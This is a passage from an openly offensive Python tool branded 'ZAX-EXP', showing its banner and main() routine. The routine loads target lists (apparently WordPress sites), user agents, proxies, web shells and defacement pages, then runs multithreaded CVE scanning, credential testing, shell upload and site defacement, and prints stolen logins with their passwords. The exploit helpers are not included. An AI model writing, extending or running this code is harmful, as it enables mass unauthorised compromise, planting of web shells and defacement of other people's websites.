⢠⣿⠏⠀⣏⢀⣠⠴⠛⠉⠀⠀⠀⠀⠈⠁⠀⠀⠀⠛⠀⠈⠀⠀⠀⠀⠈⢿⣿⣼⣿⣿⣿⣿⢿⣿⣿⣶⠀⠀⠀⠀⠀⠁⠀⠛⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠛⠦⣄⣀⣹⠀⠹⣿⡄
⣼⡟⠀⣼⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠋⠁⠀⢹⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣧⠀⢻⣷
⣿⠃⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣶⣦⣤⠀⠀⣿⡿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡆⠘⣿
⣿⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠁⠈⢻⣷⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣀⣀⣸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣿
⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇
⠈⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣴⡿⣷⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⡿⣟⣿⣿⣶⡶⠋⠀\033[0m
    
    
    
╔══════════════════════════════════════════════════════════╗
║   ███████╗ █████╗ ██╗  ██╗      ███████╗██╗  ██╗██████╗ 
║      ███╔╝██╔══██╗╚██╗██╔╝      ██╔════╝╚██╗██╔╝██╔══██╗ 
║     ███╔╝ ███████║ ╚███╔╝ ████╗ █████╗   ╚███╔╝ ██████╔╝ 
║    ███╔╝  ██╔══██║ ██╔██╗ ╚═══╝ ██╔══╝   ██╔██╗ ██╔═══╝ 
║   ███████╗██║  ██║██╔╝ ██╗      ███████╗██╔╝ ██╗██║ 
║   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝      ╚══════╝╚═╝  ╚═╝╚═╝ 
╠══════════════════════════════════════════════════════════╣
║  [*] Version : 1
║  [*] Author  : azxm
╚══════════════════════════════════════════════════════════╝
'''
    print(banner)

def main():
    global userAgents, proxies, shells, defaceFiles, stats, scan_results, login_results, working_shells, defaced_sites
    global stats_lock, results_lock, verbose, max_threads, TIMEOUT
    
    print_banner()
    
    # Parse arguments
    import argparse
    parser = argparse.ArgumentParser(description='cara penggunaan/how to use')
    parser.add_argument('-t', '--target', help='Single target URL')
    parser.add_argument('-l', '--list', help='Target list file')
    parser.add_argument('-f', '--file', help='Credentials file for login testing')
    parser.add_argument('--scan-cve', action='store_true', default=True, help='Scan for CVEs')
    parser.add_argument('--upload-shell', action='store_true', help='Upload shell to vulnerable targets')
    parser.add_argument('--deface', action='store_true', help='Deface vulnerable targets')
    parser.add_argument('--threads', type=int, default=20, help='Number of threads (default: 20)')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout (default: 15)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--no-cve', action='store_true', help='Disable CVE scanning')
    
    args = parser.parse_args()
    
    # Set config
    verbose = args.verbose
    max_threads = args.threads
    TIMEOUT = args.timeout
    
    scan_cve = args.scan_cve and not args.no_cve
    upload_shell_flag = args.upload_shell
    deface_flag = args.deface
    
    config = {
        'scan_cve': scan_cve,
        'upload_shell': upload_shell_flag,
        'deface': deface_flag
    }
    
    # Load user agents
    print("[*] Loading user agents from uax/ folder...")
    userAgents = load_user_agents(ua_folder)
    print(f"[+] Loaded {len(userAgents)} user agents")
    
    # Load proxies
    print("[*] Loading proxies from uax/ folder...")
    proxies = load_proxies(proxy_folder)
    print(f"[+] Loaded {len(proxies)} proxies")
    
    # Load shells
    print("[*] Loading shells from sede/ folder...")
    shells = load_shells(shell_folder)
    print(f"[+] Loaded {len(shells)} shells")
    
    # Load deface files
    print("[*] Loading deface files from sede/ folder...")
    defaceFiles = load_deface_files(deface_folder)
    print(f"[+] Loaded {len(defaceFiles)} deface files")
    
    # Load targets
    print("[*] Loading targets from wp/ folder...")
    targets = load_targets_from_folder(wp_folder)
    print(f"[+] Loaded {len(targets):,} targets")
    
    # Initialize stats
    stats = {
        'total': len(targets),
        'scanned': 0,
        'dead': 0,
        'vulnerable': 0,
        'logins': 0,
        'shells': 0,
        'defaced': 0,
        'current': 0,
        'start': time.time(),
        'elapsed': 0
    }
    
    scan_results = []
    login_results = []
    working_shells = []
    defaced_sites = []
    
    stats_lock = threading.Lock()
    results_lock = threading.Lock()
    
    # Process targets
    if targets and scan_cve:
        print(f"\n[*] Starting scan on {len(targets):,} targets with {max_threads} threads")
        print("[*] Press Ctrl+C to stop\n")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(process_target, target, config): target for target in targets}
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    if verbose:
                        print(f"Error: {e}")
    
    # Process credentials if file provided
    if args.file:
        print(f"\n[*] Loading credentials from {args.file}...")
        credentials = load_credentials_from_file(args.file)
        print(f"[+] Loaded {len(credentials)} credentials")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(process_credential, cred, config): cred for cred in credentials}
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    if verbose:
                        print(f"Error: {e}")
    
    # Single target
    if args.target:
        print(f"\n[*] Processing single target: {args.target}")
        process_target(args.target, config)
    
    # Single target list
    if args.list:
        with open(args.list, 'r') as f:
            single_targets = [line.strip() for line in f if line.strip()]
        print(f"\n[*] Processing {len(single_targets)} targets from {args.list}")
        for target in single_targets:
            process_target(target, config)
    
    # Update elapsed time
    stats['elapsed'] = time.time() - stats['start']
    
    # Print statistics
    print_statistics()
    
    # Save results
    save_results()
    
    # Print successful logins summary
    if login_results:
        print("\n[+] SUCCESSFUL LOGINS SUMMARY:")
        for r in login_results[:20]:
            if r.get('success'):
                print(f"    {r['platform'].upper()}: {r['target']} | {r['username']} | {r['password']}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        stats['elapsed'] = time.time() - stats['start']
        print_statistics()
        save_results()
        sys.exit(0)